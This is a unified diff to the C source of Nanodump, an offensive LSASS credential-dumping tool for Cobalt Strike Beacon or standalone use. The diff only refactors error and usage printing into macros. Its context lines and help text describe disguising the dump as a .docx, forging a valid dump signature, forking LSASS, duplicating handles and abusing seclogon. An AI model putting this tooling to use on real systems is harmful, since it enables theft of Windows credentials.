@@ -30,13 +30,7 @@ BOOL append(
 {
     if (dc->rva + size > dc->DumpMaxSize)
     {
-#ifdef BOF
-        BeaconPrintf(CALLBACK_ERROR,
-#else
-        printf(
-#endif
-            "The dump is too big, please increase DUMP_MAX_SIZE.\n"
-        );
+        PRINT_ERR("The dump is too big, please increase DUMP_MAX_SIZE.");
         return FALSE;
     }
     else
@@ -526,13 +520,8 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
         // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
         if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
         {
-#ifdef DEBUG
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...\n",
+            DPRINT_ERR(
+                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%llx, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...",
                 (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
                 curr_range->DataSize,
                 curr_range->State,
@@ -540,7 +529,6 @@ PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
                 curr_range->Type,
                 status
             );
-#endif
             //return NULL;
         }
         if (!append(dc, buffer, curr_range->DataSize))
@@ -640,11 +628,7 @@ void go(char* args, int length)
 
     if (get_pid_and_leave)
     {
-        BeaconPrintf(
-            CALLBACK_OUTPUT,
-            "LSASS PID: %ld\n",
-            lsass_pid
-        );
+        PRINT("LSASS PID: %ld", lsass_pid);
         return;
     }
 
@@ -794,23 +778,23 @@ void go(char* args, int length)
 
 void usage(char* procname)
 {
-    printf("usage: %s [--getpid] --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]\n", procname);
-    printf("    --getpid\n");
-    printf("            print the PID of LSASS and leave\n");
-    printf("    --write PATH, -w PATH\n");
-    printf("            full path to the dumpfile\n");
-    printf("    --valid, -v\n");
-    printf("            create a dump with a valid signature\n");
-    printf("    --fork, -f\n");
-    printf("            fork target process before dumping\n");
-    printf("    --dup, -d\n");
-    printf("            duplicate an existing LSASS handle\n");
-    printf("    --malseclogon, -m\n");
-    printf("            obtain a handle to LSASS by (ab)using seclogon\n");
-    printf("    --binary PATH, -b PATH\n");
-    printf("            full path to the decoy binary used with --dup and --malseclogon\n");
-    printf("    --help, -h\n");
-    printf("            print this help message and leave");
+    PRINT("usage: %s [--getpid] --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]", procname);
+    PRINT("    --getpid");
+    PRINT("            print the PID of LSASS and leave");
+    PRINT("    --write PATH, -w PATH");
+    PRINT("            full path to the dumpfile");
+    PRINT("    --valid, -v");
+    PRINT("            create a dump with a valid signature");
+    PRINT("    --fork, -f");
+    PRINT("            fork target process before dumping");
+    PRINT("    --dup, -d");
+    PRINT("            duplicate an existing LSASS handle");
+    PRINT("    --malseclogon, -m");
+    PRINT("            obtain a handle to LSASS by (ab)using seclogon");
+    PRINT("    --binary PATH, -b PATH");
+    PRINT("            full path to the decoy binary used with --dup and --malseclogon");
+    PRINT("    --help, -h");
+    PRINT("            print this help message and leave");
 }
 
 int main(int argc, char* argv[])
@@ -832,9 +816,7 @@ int main(int argc, char* argv[])
 #ifndef _WIN64
     if(IsWoW64())
     {
-        printf(
-            "Nanodump does not support WoW64\n"
-        );
+        PRINT_ERR("Nanodump does not support WoW64");
         return -1;
     }
 #endif
@@ -855,13 +837,13 @@ int main(int argc, char* argv[])
         {
             if (i + 1 >= argc)
             {
-                printf("missing --write value\n");
+                PRINT("missing --write value");
                 return -1;
             }
             dump_path = argv[++i];
             if (!strrchr(dump_path, '\\'))
             {
-                printf("You must provide a full path: %s\n", dump_path);
+                PRINT("You must provide a full path: %s", dump_path);
                 return -1;
             }
         }
@@ -870,7 +852,7 @@ int main(int argc, char* argv[])
         {
             if (i + 1 >= argc)
             {
-                printf("missing --pid value\n");
+                PRINT("missing --pid value");
                 return -1;
             }
             i++;
@@ -878,7 +860,7 @@ int main(int argc, char* argv[])
             if (!lsass_pid ||
                 strspn(argv[i], "0123456789") != strlen(argv[i]))
             {
-                printf("Invalid PID: %s\n", argv[i]);
+                PRINT("Invalid PID: %s", argv[i]);
                 return -1;
             }
         }
@@ -907,18 +889,18 @@ int main(int argc, char* argv[])
         {
             if (i + 1 >= argc)
             {
-                printf("missing --binary value\n");
+                PRINT("missing --binary value");
                 return -1;
             }
             malseclogon_target_binary = argv[++i];
             if (!strrchr(malseclogon_target_binary, '\\'))
             {
-                printf("You must provide a full path: %s\n", malseclogon_target_binary);
+                PRINT("You must provide a full path: %s", malseclogon_target_binary);
                 return -1;
             }
             if (!file_exists(malseclogon_target_binary))
             {
-                printf("The binary \"%s\" does not exists.\n", malseclogon_target_binary);
+                PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
                 return -1;
             }
         }
@@ -930,7 +912,7 @@ int main(int argc, char* argv[])
         }
         else
         {
-            printf("invalid argument: %s\n", argv[i]);
+            PRINT("invalid argument: %s", argv[i]);
             return -1;
         }
     }
@@ -949,29 +931,26 @@ int main(int argc, char* argv[])
 
     if (get_pid_and_leave)
     {
-        printf(
-            "LSASS PID: %ld\n",
-            lsass_pid
-        );
+        PRINT("LSASS PID: %ld", lsass_pid);
         return 0;
     }
 
     if (!dump_path)
     {
-        printf("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx\n\n");
+        PRINT("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx");
         usage(argv[0]);
         return -1;
     }
 
     if (duplicate_handle && use_malseclogon && !malseclogon_target_binary)
     {
-        printf("If --dup and --malseclogon are used, you need to provide a binary with --binary\n");
+        PRINT("If --dup and --malseclogon are used, you need to provide a binary with --binary");
         return -1;
     }
 
     if ((!duplicate_handle || !use_malseclogon) && malseclogon_target_binary)
     {
-        printf("The option --binary can only be used with --malseclogon and --dup\n");
+        PRINT("The option --binary can only be used with --malseclogon and --dup");
         return -1;
     }
 
